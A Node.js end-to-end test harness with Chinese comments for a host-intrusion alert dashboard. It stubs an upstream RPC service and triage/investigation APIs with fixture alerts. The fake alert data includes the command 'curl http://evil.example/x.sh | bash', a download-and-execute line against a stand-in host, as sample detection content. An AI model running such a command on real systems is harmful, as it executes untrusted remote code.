// P003-T007 测试席自建装置（不进产品代码、不 import 产品模块）。
//
// 拓扑（全部 127.0.0.1、临时端口）：
//   Chrome ──> web/serve.js ──> facade ──> 真 server.js ──> 假牧云 /rpc
//                                   └──> 文档契约替身（仅两个读接口：triage 单条、investigations）
//
// 为什么这样搭：
// - /api/alerts、/api/session、/api/wiki/** 走**真 server.js**（假牧云 /rpc 只在最外层上游），
//   这样筛选/排序是服务端真过滤，"真参数" 才不是自己骗自己；wiki 的 409/400 也是真的 store 抛的。
// - 三人行 D: 研判记录（evidence[] / claims.citations[]）需要 done 态数据，本机没有模型与牧云，
//   两条读接口按 openapi.yaml 的 TriageCase / Investigation / TriageEvidence / ClaimCitation 契约造替身，
//   页面消费的是文档形状，替身数据不符合契约就是替身的错，脚本里逐字段照 schema 写。
// - 所有运行态目录（wiki 副本、日志）在 /tmp，退出时回收；不写仓库外共享目录。
import http from 'node:http';
import net from 'node:net';
import { spawn } from 'node:child_process';
import { setTimeout as sleep } from 'node:timers/promises';
import { mkdtempSync, rmSync, cpSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';

export const REPO = path.resolve(new URL('../../../', import.meta.url).pathname);
const TMP = mkdtempSync(path.join(tmpdir(), 'p003-t007-e2e-'));

/* ---------------- 造数：告警（相对现在的偏移，顺序确定） ---------------- */
const now = Date.now();
const at = (minutesAgo) => new Date(now - minutesAgo * 60000).toISOString();
const LONG_TITLE = '异常进程链：' + 'bash → curl → sh → /tmp/.x → 反弹连接失败重试（长标题用于检查单行截断与 title 全文）'.repeat(3);

export const ALERT_FIXTURE = [
  // id, 类型键, 时间偏移(分钟), level(1低 4严重), 标题, 资产, IP
  { id: 1, type: 'webshell', ago: 180, level: 4, title: 'WebShell 落地', asset: 'db-1', ip: '10.0.0.1' },
  { id: 2, type: 'webshell', ago: 120, level: 2, title: '可疑上传', asset: 'web-2', ip: '10.0.0.2' },
  { id: 3, type: 'webshell', ago: 240, level: 3, title: 'WebShell 回连', asset: 'db-1', ip: '10.0.0.1' },
  { id: 9, type: 'webshell', ago: 60, level: 3, title: 'WebShell 二次落地', asset: 'db-1', ip: '10.0.0.1' },
  { id: 5, type: 'malware', ago: 300, level: 3, title: '恶意文件落地', asset: 'app-3', ip: '10.0.0.3' },
  { id: 6, type: 'malware', ago: 26 * 60, level: 1, title: '可疑脚本', asset: 'app-3', ip: '10.0.0.3' },
  { id: 7, type: 'malware', ago: 360, level: 2, title: LONG_TITLE, asset: 'app-4', ip: '10.0.0.4' },
  { id: 4, type: 'honeypot', ago: 8 * 24 * 60, level: 1, title: '蜜罐命中', asset: 'honeypot-1', ip: '10.0.0.9' },
];

const TYPE_METHOD = {
  webshell: 'WebshellEventService.GetEventList',
  malware: 'MalwareEventService.GetEventList',
  revshell: 'RevshellEventService.GetEventList',
  memory_webshell: 'MemoryWebshellEventService.GetEventList',
  brute_force: 'BruteForceService.GetEventList',
  abnormal_login: 'AbnormalLoginEventService.GetEventList',
  elevation_process: 'ElevationProcessEventService.GetEventList',
  network_audit: 'NetworkAuditEventService.GetEventList',
  suspicious_operation: 'SuspiciousOperationService.GetEventList',
  honeypot: 'HoneypotService.List',
  memory_security: 'MemorySecurityEventService.GetEventList',
};
const METHOD_TYPE = Object.fromEntries(Object.entries(TYPE_METHOD).map(([k, v]) => [v, k]));

function upstreamRow(a) {
  const when = at(a.ago);
  return {
    id: a.id,
    event_name: a.title,
    created_at: when,
    detected_at: when,
    level: a.level,
    host: { host_name: a.asset, host_ip: a.ip },
    host_name: a.asset,
    host_ip: a.ip,
    username: 'svc',
    cmdline: a.type === 'webshell' ? 'curl http://evil.example/x.sh | bash' : '/tmp/x.sh',
    source_ip: '203.0.113.9',
    destination_ip: a.ip,
  };
}

export const state = {
  upstream: 'normal',      // normal | empty | failOne | failAll
  alerts401: false,        // facade 对 /api/alerts 直接 401
  delayAlerts: 0,          // facade 对 /api/alerts 延迟（ms）
  detail: 'full',          // full | no_evidence | triage_error
  session: 'real',         // real | anonymous
  big: 0,                  // >0：webshell 类型造这么多条事件（用于 truncated 扫描窗口）
};
export const log = { alerts: [], triageHits: [], invHits: [], rpc: [], all: [] };

function corsless(res, status, body, headers = {}) {
  res.writeHead(status, { 'content-type': 'application/json; charset=utf-8', ...headers });
  res.end(typeof body === 'string' ? body : JSON.stringify(body));
}

/* ---------------- 假牧云 /rpc ---------------- */
export async function startUpstream() {
  const srv = http.createServer((req, res) => {
    const method = new URL(req.url, 'http://x').searchParams.get('method');
    log.rpc.push(method);
    const type = METHOD_TYPE[method];
    // 单条详情：<服务名>.GetEvent，参数 { id }（docs/modules/event-gateway.md §8.1）
    if (!type && /\.GetEvent$/.test(method)) {
      return (async () => {
        let body = '';
        for await (const c of req) body += c;
        let params = {};
        try { params = JSON.parse(body).params || {}; } catch { /* 空体 */ }
        const row = ALERT_FIXTURE.find((a) => a.id === Number(params.id));
        if (!row) return corsless(res, 200, { jsonrpc: '2.0', id: 1, error: { code: -32000, message: '事件不存在' } });
        return corsless(res, 200, { jsonrpc: '2.0', id: 1, result: { event: upstreamRow(row) } });
      })();
    }
    if (!type) return corsless(res, 200, { jsonrpc: '2.0', id: 1, error: { code: -32601, message: `未知方法 ${method}` } });
    if (state.upstream === 'failAll') return corsless(res, 500, { error: '牧云内部错误' });
    if (state.upstream === 'failOne' && type === 'webshell') return corsless(res, 500, { error: 'webshell 服务不可用' });
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', () => {
      let params = {};
      try { params = JSON.parse(body).params || {}; } catch { /* 空体 */ }
      let rows = state.upstream === 'empty'
        ? []
        : ALERT_FIXTURE.filter((a) => a.type === type).map(upstreamRow);
      if (state.big > 0 && type === 'webshell') {
        rows = Array.from({ length: state.big }, (_, i) => upstreamRow({
          id: 1000 + i, type: 'webshell', ago: 60 + i, level: [1, 2, 3, 4][i % 4], title: `批量 WebShell 事件 ${i}`, asset: 'db-bulk', ip: '10.9.0.1',
        }));
      }
      const count = Number(params.count) || 20;
      const offset = Number(params.offset) || 0;
      corsless(res, 200, { jsonrpc: '2.0', id: 1, result: { events: rows.slice(offset, offset + count), total: rows.length } });
    });
  });
  await new Promise((ok) => srv.listen(0, '127.0.0.1', ok));
  return { srv, port: srv.address().port };
}

/* ---------------- 文档契约替身：triage 单条 + investigations ---------------- */
const sha = (n) => String(n).repeat(64).slice(0, 64);
const TRIAGE_CASE = {
  alert_id: 'webshell:9',
  matched_alert_id: 'webshell:9',
  status: 'done',
  stage: 'done',
  detail: '研判完成',
  verdict_label: '真实威胁',
  report: '主机 db-1 出现 WebShell 落地与回连，来源 203.0.113.9，已确认。',
  verified_facts: 2,
  evidence_sources: 2,
  evidence: [
    { evidence_id: 'cw:1', tool: 'list_host_events', fetched_at: at(58), sha256: sha('a') },
    { evidence_id: 'cw:2', tool: 'list_host_events', fetched_at: at(57), sha256: sha('b') },
    { evidence_id: 'mcp:3', tool: 'list_firewall_connection_records', fetched_at: at(56), sha256: sha('c') },
  ],
  steps: [
    { stage: '关联事件', detail: '命中牧云事件 webshell:9', at: at(57) },
    { stage: 'AI 分析', detail: '取证 3 条，形成 3 条事实', at: at(56) },
    { stage: '完成研判', detail: '结论：真实威胁', at: at(55) },
  ],
};
const INVESTIGATION = {
  alert_id: 'webshell:9',
  mode: 'triage',
  saved_at: at(55),
  verdict: {
    verdict: 'threat',
    verdict_label: '真实威胁',
    report: '主机 db-1 出现 WebShell 落地与回连，来源 203.0.113.9，已确认。',
    summary: 'WebShell 落地并尝试回连。',
    claims: [
      { text: 'db-1 在 60 分钟前出现 WebShell 落地事件', citations: [{ evidence_id: 'cw:1', pointer: 'events[0].event_name', value: 'WebShell 落地' }] },
      { text: '来源 IP 203.0.113.9 与防火墙记录一致', citations: [{ evidence_id: 'mcp:3', pointer: 'records[0].source_ip', value: '203.0.113.9' }] },
      { text: '命令含 curl 管道执行，命中了已知落地方式', citations: [{ evidence_id: 'cw:2', pointer: 'events[0].cmdline', value: 'curl ... | bash' }, { evidence_id: 'cw:99', pointer: 'events[9].cmdline', value: 'x' }] },
    ],
    missing_evidence: ['主机内存镜像'],
  },
  review: { assessment: 'supported', concerns: [], missing_evidence: [] },
  validation: { ok: false, errors: ['claims[2].citations[1] 的 cw:99 无法从取证记录中解出'] },
  evidence: [
    { evidence_id: 'cw:1', tool: 'list_host_events', args: { host: 'db-1' }, fetched_at: at(58), sha256: sha('a') },
    { evidence_id: 'cw:2', tool: 'list_host_events', args: { host: 'db-1' }, fetched_at: at(57), sha256: sha('b') },
    { evidence_id: 'mcp:3', tool: 'list_firewall_connection_records', args: { ip: '10.0.0.1' }, fetched_at: at(56), sha256: sha('c') },
  ],
  trace: [],
  required_evidence: [],
};

/* ---------------- facade：全量反代真后端，只有两条读接口走替身 ---------------- */
export async function startFacade(backendPort) {
  const srv = http.createServer(async (req, res) => {
    const url = new URL(req.url, 'http://x');
    const p = url.pathname;

    // 控制面（测试专用，只在 facade 上，不进 web/serve.js 的反代路径）
    if (p === '/__stub/control') {
      let body = '';
      for await (const c of req) body += c;
      try { Object.assign(state, JSON.parse(body || '{}')); } catch { /* 忽略 */ }
      return corsless(res, 200, { ok: true, state });
    }
    if (p === '/__stub/log') return corsless(res, 200, log);
    if (p === '/__stub/resetlog') { log.alerts.length = 0; log.triageHits.length = 0; log.invHits.length = 0; log.rpc.length = 0; log.all.length = 0; return corsless(res, 200, { ok: true }); }

    if (p === '/api/alerts' && state.alerts401) {
      return corsless(res, 401, '需要登录后访问', { 'content-type': 'text/plain; charset=utf-8' });
    }
    if (p.startsWith('/api/')) log.all.push({ m: req.method, p, q: url.search, auth: !!req.headers.authorization });
    if (p === '/api/alerts') log.alerts.push(url.search);
    if (p === '/api/session' && state.session === 'anonymous') {
      return corsless(res, 200, { authenticated: true, user: null, role: null });
    }

    const triageOne = /^\/api\/agent\/triage\/(?!status$)(.+)$/.exec(p);
    if (triageOne && req.method === 'GET') {
      log.triageHits.push(decodeURIComponent(triageOne[1]));
      if (state.detail === 'triage_error') return corsless(res, 502, { error: '研判记录读取失败（替身故障）' });
      if (state.detail === 'no_evidence') {
        return corsless(res, 200, { ...TRIAGE_CASE, evidence: [], steps: [] });
      }
      const id = decodeURIComponent(triageOne[1]);
      return corsless(res, 200, { ...TRIAGE_CASE, alert_id: id, matched_alert_id: id });
    }
    const invOne = /^\/api\/agent\/investigations\/(.+)$/.exec(p);
    if (invOne && req.method === 'GET') {
      log.invHits.push(decodeURIComponent(invOne[1]));
      const mode = url.searchParams.get('mode') || 'triage';
      if (state.detail === 'no_evidence') return corsless(res, 404, { error: '没有研判记录' });
      if (state.detail === 'triage_error') return corsless(res, 404, { error: '没有研判记录' });
      if (mode !== 'triage') return corsless(res, 404, { error: '没有研判记录' });
      const id = decodeURIComponent(invOne[1]);
      return corsless(res, 200, { ...INVESTIGATION, alert_id: id });
    }

    if (p === '/api/alerts' && state.delayAlerts > 0) await sleep(state.delayAlerts);

    // 其余全部反代到真 server.js
    const upstream = http.request({
      hostname: '127.0.0.1', port: backendPort, path: req.url, method: req.method, headers: req.headers,
    }, (up) => {
      res.writeHead(up.statusCode || 502, up.headers);
      up.pipe(res);
    });
    upstream.on('error', () => corsless(res, 502, { error: '后端不可达' }));
    req.pipe(upstream);
  });
  await new Promise((ok) => srv.listen(0, '127.0.0.1', ok));
  return { srv, port: srv.address().port };
}

/* ---------------- 子进程 ---------------- */
const children = new Set();
export async function freePort() {
  return new Promise((resolve, reject) => {
    const s = net.createServer();
    s.listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => resolve(p)); });
    s.on('error', reject);
  });
}

export async function spawnNode(args, env, what, readyUrl, headers = {}) {
  const child = spawn(process.execPath, args, {
    cwd: REPO,
    env: { PATH: process.env.PATH, HOME: process.env.HOME, ...env },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  children.add(child);
  let out = '';
  child.stdout.on('data', (c) => { out += c; });
  child.stderr.on('data', (c) => { out += c; });
  child.on('exit', () => children.delete(child));
  const deadline = Date.now() + 20000;
  while (Date.now() < deadline) {
    try {
      const r = await fetch(readyUrl, { headers, signal: AbortSignal.timeout(1000) });
      if (r.status < 500) return { child, log: () => out };
    } catch { /* 还没起来 */ }
    await sleep(120);
  }
  child.kill('SIGKILL');
  throw new Error(`${what} 未在 20s 内就绪；输出：${out.slice(0, 1200)}`);
}

export async function stop(child) {
  if (!child || child.exitCode !== null) return;
  child.kill('SIGTERM');
  const deadline = Date.now() + 4000;
  while (child.exitCode === null && Date.now() < deadline) await sleep(50);
  if (child.exitCode === null) child.kill('SIGKILL');
}

export function cleanupAll() {
  for (const c of children) { try { c.kill('SIGKILL'); } catch { /* 已退出 */ } }
  children.clear();
  try { rmSync(TMP, { recursive: true, force: true }); } catch { /* 已删 */ }
}

export { TMP };

/** 起整套装置。返回各端口与可读的 wiki 副本目录。 */
export async function boot({ authUser = 'ops', authPass = 'ops123' } = {}) {
  const up = await startUpstream();
  const bePort = await freePort();
  const wikiDir = path.join(TMP, 'wiki');
  cpSync(path.join(REPO, 'wiki'), wikiDir, { recursive: true });
  const be = await spawnNode(
    ['server.js'],
    {
      HIDS_HOST: '127.0.0.1', HIDS_PORT: String(bePort),
      HIDS_BASIC_AUTH_USER: authUser, HIDS_BASIC_AUTH_PASSWORD: authPass,
      CLOUDWALKER_URL: `http://127.0.0.1:${up.port}`, CLOUDWALKER_API_TOKEN: 'token-abcdef',
      HIDS_WIKI_DIR: wikiDir,
      HIDS_PROMPT_ADMIN_TOKEN: 'p003-t007-admin',
      HIDS_TRIAGE_INPUT_MODE: 'syslog',
    },
    'server.js',
    `http://127.0.0.1:${bePort}/api/session`,
    { authorization: 'Basic ' + Buffer.from(`${authUser}:${authPass}`).toString('base64') },
  );
  const facade = await startFacade(bePort);
  const webPort = await freePort();
  const web = await spawnNode(
    ['web/serve.js'],
    { HIDS_API_ORIGIN: `http://127.0.0.1:${facade.port}`, HIDS_WEB_PORT: String(webPort) },
    'web/serve.js',
    `http://127.0.0.1:${webPort}/`,
  );
  return {
    upstreamPort: up.port,
    backendPort: bePort,
    facadePort: facade.port,
    webOrigin: `http://127.0.0.1:${webPort}`,
    wikiDir,
    backendLog: be.log,
    webLog: web.log,
    procs: [be.child, web.child],
    close: async () => {
      await stop(web.child);
      await stop(be.child);
      up.srv.close();
      facade.srv.close();
    },
  };
}

export const auth = (user, pass) => 'Basic ' + Buffer.from(`${user}:${pass}`).toString('base64');
export const readWiki = (dir, rel) => readFileSync(path.join(dir, rel), 'utf8');
export const writeWiki = (dir, rel, text) => writeFileSync(path.join(dir, rel), text);
